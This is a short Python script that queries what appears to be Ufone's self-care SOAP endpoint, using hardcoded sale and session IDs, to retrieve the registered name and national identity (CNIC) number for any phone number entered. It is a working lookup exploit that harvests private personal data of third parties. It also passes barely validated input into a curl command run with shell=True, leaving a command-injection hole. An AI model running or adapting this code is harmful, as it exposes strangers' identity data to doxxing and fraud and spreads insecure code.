import subprocess
import json
import time

def format_number(number):
    if number.startswith("0"):
        return "92" + number[1:]
    elif number.startswith("92") and len(number) == 12:
        return number
    return None

def format_to_local(number):
    if number.startswith("92") and len(number) == 12:
        return "0" + number[2:]
    return number

def get_ufone_response(number):
    formatted_number = format_number(number)
    if formatted_number is None:
        raise ValueError("Invalid number format")
    
    curl_command = f'curl -s -X POST -H "Content-Type: text/xml" -d "<soap:Envelope xmlns:soap=\'http://schemas.xmlsoap.org/soap/envelope/\' xmlns:tem=\'http://tempuri.org/\'><soap:Body><tem:CustomerInformationUpdated><tem:msisdn>{formatted_number}</tem:msisdn><tem:saleid>145844044</tem:saleid><tem:sessionid>421110260</tem:sessionid></tem:CustomerInformationUpdated></soap:Body></soap:Envelope>" "https://selfcareapp.ufone.com/SelfCareApp/service.asmx"'
    
    try:
        response = subprocess.check_output(curl_command, shell=True, encoding='utf-8')
        json_data = json.loads(response.split("<CustomerInformationUpdatedResult>")[1].split("</CustomerInformationUpdatedResult>")[0])
        formatted_local_number = format_to_local(number)
        customer_name = json_data['data'][0]['customername'].upper()  # Convert customer name to uppercase
        cnic_number = json_data['data'][0]['nic']
        if not customer_name or not cnic_number:  # Check if customer name or CNIC number is empty
            return None
        return f"\n\nCUSTOMER NUMBER: {formatted_local_number}\n\nCUSTOMER NAME: {customer_name}\n\nCUSTOMER CNIC: {cnic_number}\n"
    except subprocess.CalledProcessError as e:
        raise ValueError(f"An internal issue occurred: {e}")
    except json.JSONDecodeError as e:
        raise ValueError("Internal Error")
    except Exception as e:
        raise ValueError(f"An internal issue occurred: {e}")

def main():
    while True:
        number = input("Please enter the number (e.g., 0330*******): ").strip()
        formatted_number = format_number(number)
        if formatted_number is None:
            print("Invalid input. Please enter a valid 11-digit number.")
            continue  # Ignore invalid format numbers
        retries = 3  # Number of retries
        while retries > 0:
            try:
                customer_info = get_ufone_response(number)
                if customer_info:  # Check if info is not empty
                    print(customer_info)
                else:
                    print(f"Other Network Number {number}.")
                break
            except ValueError as e:
                retries -= 1
                if retries == 0:
                    print(f"Other Network Number {number}.")
                else:
                    time.sleep(1)  # Add a small delay before retrying

if __name__ == "__main__":
    main()
